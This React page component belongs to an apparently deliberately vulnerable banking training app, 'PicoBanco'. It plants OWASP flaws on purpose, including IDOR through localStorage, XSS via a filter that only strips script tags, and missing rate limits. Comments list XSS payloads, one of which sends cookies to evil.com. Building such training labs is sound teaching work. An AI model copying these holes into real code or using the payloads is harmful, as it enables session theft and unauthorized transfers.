// src/pages/createTransaction.jsx
/*
  VULNERABILIDADES IMPLEMENTADAS:
  - A01:2021 Broken Access Control (IDOR): Permite hacer transferencias desde cuenta ajena
  - A02:2021 Cryptographic Failures: accountNumber en localStorage sin cifrar
  - A03:2021 Injection (XSS): dangerouslySetInnerHTML con sanitización débil (solo quita <script>)
  - A04:2021 Insecure Design: Sin rate limiting, permite transferencias rápidas múltiples
  - A05:2021 Security Misconfiguration: URL hardcoded, sin validación de montos máximos
  - A07:2021 Authentication Failures: Confía en localStorage para datos críticos
  - A09:2021 Security Logging Failures: No registra transacciones creadas
*/
import React, { useState, useEffect } from "react";
import Header from "../components/header.jsx";
import * as txService from "../services/transaction.service";
import axios from "axios";
import { detectXSS, showXSSFlag } from "../utils/flagDetector.js";

// VULNERABLE A03:2021 - Injection (XSS - CRÍTICO)
// stripScriptTags es INSUFICIENTE para prevenir XSS
// Solo elimina etiquetas <script> pero permite otros vectores de ataque:
// - <img src=x onerror="alert('XSS')">
// - <svg onload="alert('XSS')">
// - <iframe src="javascript:alert('XSS')">
// - <a href="javascript:alert('XSS')">Click</a>
// - <input onfocus="alert('XSS')" autofocus>
// Debería usar DOMPurify.sanitize() en su lugar
function stripScriptTags(html = "") {
  return html.replace(/<script[\s\S]*?>[\s\S]*?<\/script>/gi, "");
}

export default function CreateTransaction() {
  // VULNERABLE A01:2021 - Broken Access Control (IDOR - CRÍTICO)
  // VULNERABLE A02:2021 - Cryptographic Failures (CRÍTICO)
  // VULNERABLE A07:2021 - Identification and Authentication Failures
  // accountNumber obtenido de localStorage sin cifrar
  // localStorage es accesible por cualquier script en el dominio (XSS)
  // No hay validación de que accountNumber sea válido o del usuario actual
  // Si manipulas userId en localStorage, puedes hacer transferencias desde otras cuentas
  const myAccountNumber = localStorage.getItem("accountNumber") || "";

  const [receiverAccount, setReceiverAccount] = useState("");
  const [accountValid, setAccountValid] = useState(null);
  const [accountHolder, setAccountHolder] = useState("");
  const [amount, setAmount] = useState("");
  const [description, setDescription] = useState("");
  const [msg, setMsg] = useState(null);
  const [flag, setFlag] = useState(null);
  const [loading, setLoading] = useState(false);
  const [validating, setValidating] = useState(false);
  const [showPreview, setShowPreview] = useState(false);
  const [errorFields, setErrorFields] = useState({});
  const [xssExecuted, setXssExecuted] = useState(false);

  // 🚩 DETECTAR XSS EN TIEMPO REAL
  useEffect(() => {
    if (description && detectXSS(description)) {
      setFlag(showXSSFlag());
    } else if (flag?.vulnerability?.includes("XSS")) {
      setFlag(null);
    }
  }, [description]);

  // VULNERABLE A05:2021 - Security Misconfiguration
  // URL del backend hardcoded en código fuente
  // Debería usar variable de entorno (import.meta.env.VITE_API_URL)
  // VULNERABLE A04: Sin rate limiting, permite validaciones masivas
  async function validateAccount(accountNum) {
    if (!accountNum || accountNum.length < 10) {
      setAccountValid(null);
      setAccountHolder("");
      return;
    }

    setValidating(true);
    try {
      // VULNERABLE A05: URL hardcoded
      const res = await axios.get(
        `http://localhost:4000/api/transactions/validate/${accountNum}`
      );

      // VULNERABLE A09:2021 - Security Logging Failures
      // console.log expone datos en producción
      console.log("✅ Respuesta completa:", res.data);

      if (res.data.valid === true) {
        setAccountValid(true);
        // VULNERABLE A02: accountHolder (nombre de otro usuario) almacenado sin cifrar
        setAccountHolder(res.data.user?.name || "Usuario");
      } else {
        setAccountValid(false);
        setAccountHolder("");
      }
    } catch (err) {
      // VULNERABLE A09: Error logging en consola (visible en producción)
      console.error("❌ Error validando cuenta:", err);
      setAccountValid(false);
      setAccountHolder("");
    } finally {
      setValidating(false);
    }
  }

  // VULNERABLE A04:2021 - Insecure Design
  // Debounce de 500ms permite múltiples requests en poco tiempo
  // Sin límite de intentos de validación
  function handleReceiverChange(value) {
    setReceiverAccount(value);
    setAccountValid(null);
    setAccountHolder("");

    // VULNERABLE A05: window.validateTimeout es variable global
    // Puede ser manipulada desde consola del navegador
    clearTimeout(window.validateTimeout);
    window.validateTimeout = setTimeout(() => {
      validateAccount(value);
    }, 500);
  }

  function validate() {
    const errors = {};
    if (!receiverAccount?.trim())
      errors.receiverAccount = "Cuenta destino requerida";
    if (accountValid === false) errors.receiverAccount = "La cuenta no existe";
    if (!amount?.toString().trim()) errors.amount = "Monto requerido";
    if (isNaN(Number(amount)) || Number(amount) <= 0)
      errors.amount = "El monto debe ser un número positivo";

    // VULNERABLE A05:2021 - Security Misconfiguration
    // Sin validación de monto máximo
    // Permite transferencias de cantidades absurdas (ej: $999999999)
    // Sin validación de límite diario de transferencias

    // VULNERABLE A01: No valida que myAccountNumber pertenezca al usuario autenticado
    // Permite transferir desde cuentas ajenas si se manipula localStorage
    if (receiverAccount === myAccountNumber)
      errors.receiverAccount = "No puedes transferir a tu propia cuenta";
    return errors;
  }

  // 🚩 EJECUTAR XSS DESPUÉS DE CREAR TRANSACCIÓN
  function executeXSS(descriptionHTML) {
    // Crear contenedor temporal para ejecutar el XSS
    const tempDiv = document.createElement("div");
    tempDiv.style.display = "none";
    tempDiv.innerHTML = descriptionHTML;
    document.body.appendChild(tempDiv);

    // Remover después de 100ms
    setTimeout(() => {
      document.body.removeChild(tempDiv);
    }, 100);

    setXssExecuted(true);
  }

  // VULNERABLE A01:2021 - Broken Access Control (IDOR - CRÍTICO)
  // VULNERABLE A04:2021 - Insecure Design (CRÍTICO)
  // Sin rate limiting: permite múltiples transferencias rápidas
  // Sin confirmación adicional para montos grandes
  // VULNERABLE A09: No registra transacciones creadas
  async function onSubmit(e) {
    e.preventDefault();
    setMsg(null);
    setXssExecuted(false);
    const errors = validate();
    setErrorFields(errors);
    if (Object.keys(errors).length) return;

    setLoading(true);
    try {
      // VULNERABLE A01: myAccountNumber viene de localStorage manipulable
      // VULNERABLE A07: Confía en localStorage para identificar la cuenta origen
      // Si cambias accountNumber en localStorage, puedes hacer transferencias desde otras cuentas
      // VULNERABLE A03: description enviado sin sanitizar al backend
      // Permite SQL injection si el backend concatena (ver transaction.model.js)
      const res = await txService.create({
        senderAccount: myAccountNumber, // VULNERABLE A01 + A07: De localStorage manipulable
        receiverAccount: receiverAccount.trim(),
        amount: Number(amount),
        description: description, // VULNERABLE A03: Sin sanitizar
      });

      // 🚩 DETECTAR FLAG EN RESPUESTA (SQL Injection)
      if (res.data?.flag && res.data.flag.vulnerability?.includes("SQL")) {
        setFlag(res.data.flag);
      }

      // 🚩 EJECUTAR XSS SI FUE DETECTADO
      if (detectXSS(description)) {
        const sanitized = stripScriptTags(description);
        executeXSS(sanitized);
      }

      // VULNERABLE A09: Transacción exitosa sin logging
      // No registra: timestamp, monto, cuenta destino, IP
      setMsg({
        type: "success",
        text: `Transacción exitosa. Nuevo saldo: $${res.data.newBalance?.toFixed(2)}`,
      });

      setReceiverAccount("");
      setAmount("");
      setDescription("");
      setAccountValid(null);
      setAccountHolder("");
      setErrorFields({});
    } catch (err) {
      // 🚩 DETECTAR FLAG EN ERROR (SQL Injection)
      if (err?.response?.data?.flag) {
        setFlag(err.response.data.flag);
      }

      // VULNERABLE A05: Expone error completo del backend
      const detail = err?.response?.data?.error || err?.message || String(err);
      setMsg({ type: "error", text: detail });
    } finally {
      setLoading(false);
    }
  }

  // VULNERABLE A03: stripScriptTags es insuficiente
  const sanitized = stripScriptTags(description || "");

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#0b1220] to-[#08101a] text-gray-100">
      <Header />

      <main className="max-w-4xl mx-auto px-8 py-6">
        <header className="mb-8">
          <h2 className="text-3xl font-bold text-blue-400 mb-2">
            Nueva Transacción
          </h2>
          <p className="text-gray-400 text-sm">
            Completa los campos para registrar una nueva transacción.
          </p>
        </header>

        <div className="bg-white/5 border border-white/10 rounded-xl p-6 shadow-md">
          {/* 🚩 MOSTRAR FLAG SI EXISTE */}
          {flag && (
            <div
              style={{
                background: flag.vulnerability?.includes("XSS")
                  ? "linear-gradient(135deg, #f59e0b 0%, #d97706 100%)"
                  : "linear-gradient(135deg, #dc2626 0%, #991b1b 100%)",
                border: flag.vulnerability?.includes("XSS")
                  ? "2px solid #fcd34d"
                  : "2px solid #fca5a5",
                borderRadius: "12px",
                padding: "16px",
                marginBottom: "20px",
                boxShadow: flag.vulnerability?.includes("XSS")
                  ? "0 4px 20px rgba(245, 158, 11, 0.3)"
                  : "0 4px 20px rgba(220, 38, 38, 0.3)",
              }}
            >
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: "12px",
                  marginBottom: "8px",
                }}
              >
                <span style={{ fontSize: "32px" }}>🚩</span>
                <h3
                  style={{
                    margin: 0,
                    color: "#fff",
                    fontSize: "18px",
                    fontWeight: "700",
                  }}
                >
                  {flag.message}
                </h3>
              </div>
              <div
                style={{
                  color: flag.vulnerability?.includes("XSS")
                    ? "#fef3c7"
                    : "#fecaca",
                  fontSize: "14px",
                  marginLeft: "44px",
                }}
              >
                <p style={{ margin: "4px 0" }}>
                  <strong>Vulnerabilidad:</strong> {flag.vulnerability}
                </p>
                <p style={{ margin: "4px 0" }}>
                  <strong>Descripción:</strong> {flag.description}
                </p>
                <p style={{ margin: "4px 0" }}>
                  <strong>Severidad:</strong> {flag.severity}
                </p>
                {xssExecuted && flag.vulnerability?.includes("XSS") && (
                  <p
                    style={{
                      margin: "8px 0 0 0",
                      color: "#fef3c7",
                      fontWeight: "600",
                    }}
                  >
                    ✅ El payload XSS se ejecutó al crear la transacción
                  </p>
                )}
              </div>
            </div>
          )}

          <form onSubmit={onSubmit} className="space-y-5">
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">
                Cuenta Origen
              </label>
              {/* VULNERABLE A01 + A02: Muestra accountNumber de localStorage (puede ser de otra cuenta) */}
              <input
                type="text"
                value={myAccountNumber}
                disabled
                className="w-full px-4 py-2 bg-gray-800 border border-gray-700 rounded-lg text-gray-400 cursor-not-allowed"
              />
              <p className="text-xs text-gray-500 mt-1">
                Cuenta desde la que se realizará la transferencia
              </p>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">
                Cuenta Destino <span className="text-red-400">*</span>
              </label>
              <input
                type="text"
                value={receiverAccount}
                onChange={(e) => handleReceiverChange(e.target.value)}
                placeholder="Ej: CR1234567890123456"
                className={`w-full px-4 py-2 bg-gray-900 border ${
                  errorFields.receiverAccount
                    ? "border-red-500"
                    : accountValid === true
                      ? "border-green-500"
                      : accountValid === false
                        ? "border-red-500"
                        : "border-gray-700"
                } rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none text-gray-100`}
              />

              {validating && (
                <p className="text-blue-400 text-xs mt-1">
                  Validando cuenta...
                </p>
              )}

              {/* VULNERABLE A02: Muestra nombre del titular sin cifrar */}
              {accountValid === true && accountHolder && (
                <p className="text-green-400 text-xs mt-1">
                  ✓ Cuenta válida - Titular: {accountHolder}
                </p>
              )}

              {accountValid === false && (
                <p className="text-red-400 text-xs mt-1">
                  ✗ Esta cuenta no existe
                </p>
              )}

              {errorFields.receiverAccount && (
                <p className="text-red-400 text-xs mt-1">
                  {errorFields.receiverAccount}
                </p>
              )}
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">
                Monto <span className="text-red-400">*</span>
              </label>
              <div className="relative">
                <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400">
                  $
                </span>
                <input
                  type="number"
                  step="0.01"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="0.00"
                  // VULNERABLE A05: Sin max attribute (permite montos absurdos)
                  className={`w-full pl-8 pr-4 py-2 bg-gray-900 border ${
                    errorFields.amount ? "border-red-500" : "border-gray-700"
                  } rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none text-gray-100`}
                />
              </div>
              {errorFields.amount && (
                <p className="text-red-400 text-xs mt-1">
                  {errorFields.amount}
                </p>
              )}
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">
                Descripción
              </label>
              {/* VULNERABLE A03: textarea sin sanitización en tiempo real */}
              <textarea
                value={description}
                onChange={(e) => setDescription(e.target.value)}
                placeholder="Descripción de la transacción"
                rows="4"
                className="w-full px-4 py-2 bg-gray-900 border border-gray-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none text-gray-100 resize-none"
              />
              {/* VULNERABLE A05: Mensaje engañoso - NO previene todos los XSS */}
              <p className="text-gray-500 text-xs mt-1">
                Se permite HTML básico (sin scripts)
              </p>
            </div>

            <div className="flex justify-between items-center pt-4">
              <button
                type="button"
                onClick={() => setShowPreview(true)}
                className="border border-gray-600 text-gray-300 hover:bg-gray-700 px-4 py-2 rounded-lg transition"
              >
                Vista previa
              </button>

              <button
                type="submit"
                disabled={loading || accountValid !== true}
                className="bg-blue-600 hover:bg-blue-500 text-white px-6 py-2 rounded-lg font-semibold transition disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {loading ? "Procesando..." : "Crear Transacción"}
              </button>
            </div>
          </form>

          {msg && (
            <div
              className={`mt-6 p-4 rounded-lg text-center ${
                msg.type === "error"
                  ? "bg-red-900/20 text-red-400 border border-red-800"
                  : "bg-green-900/20 text-green-400 border border-green-800"
              }`}
            >
              {/* VULNERABLE A03: msg.text puede contener HTML del backend */}
              {msg.text}
            </div>
          )}
        </div>

        <footer className="text-center text-gray-500 text-sm mt-10 pb-6">
          © 2025 PicoBanco — Todos los derechos reservados.
        </footer>
      </main>

      {/* VULNERABLE A03:2021 - Injection (XSS STORED - CRÍTICO) */}
      {showPreview && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-gray-900 border border-blue-500/50 rounded-xl shadow-2xl w-full max-w-2xl animate-fadeIn">
            <div className="flex justify-between items-center p-6 border-b border-gray-800">
              <h3 className="text-xl font-semibold text-blue-400">
                Vista previa de descripción
              </h3>
              <button
                onClick={() => setShowPreview(false)}
                className="text-gray-400 hover:text-white transition text-2xl leading-none"
              >
                ×
              </button>
            </div>

            <div className="p-6">
              <div className="bg-gray-800 border border-gray-700 rounded-lg p-4 min-h-[150px] max-h-[400px] overflow-auto">
                {sanitized ? (
                  // ⚠️ VULNERABLE A03: dangerouslySetInnerHTML con sanitización débil
                  // Permite XSS con payloads como:
                  // <img src=x onerror="alert(localStorage.getItem('token'))">
                  // <svg onload="fetch('https://evil.com?cookie='+document.cookie)">
                  <div
                    className="text-gray-200 prose prose-invert max-w-none"
                    dangerouslySetInnerHTML={{ __html: sanitized }}
                  />
                ) : (
                  <p className="text-gray-500 italic">
                    Sin contenido para mostrar
                  </p>
                )}
              </div>

              {/* VULNERABLE A05: Mensaje engañoso - solo elimina <script> */}
              <div className="mt-4 text-xs text-gray-500">
                <strong>Nota:</strong> Los scripts han sido eliminados por
                seguridad
              </div>
            </div>

            <div className="p-6 border-t border-gray-800 flex justify-end">
              <button
                onClick={() => setShowPreview(false)}
                className="bg-blue-600 hover:bg-blue-500 text-white px-5 py-2 rounded-lg transition"
              >
                Cerrar
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
